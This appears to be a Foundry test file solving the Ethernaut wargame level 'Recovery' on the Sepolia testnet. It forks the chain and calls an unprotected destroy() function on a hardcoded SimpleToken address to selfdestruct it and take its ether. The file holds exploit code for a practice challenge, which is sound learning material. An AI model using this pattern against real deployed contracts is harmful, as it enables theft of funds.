// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/levels/17-Recovery/Recovery.sol";

contract ContractTest is Test {
   // find address https://sepolia.etherscan.io/tx/0xa2dd0e12748db3ef12f6bbb12828f05003d4d9c31e6c82ba88c9b540a25ce5ba
    SimpleToken level17 = SimpleToken(payable(0x23aA8044aA509c133bfBcf2B9e28001257b896b2));

    function setUp() public {
 
    vm.createSelectFork(vm.rpcUrl("sepolia"));

    }

    function testExploit17() public {
        level17.destroy(payable(msg.sender));

    }
    
  receive() external payable {}
}

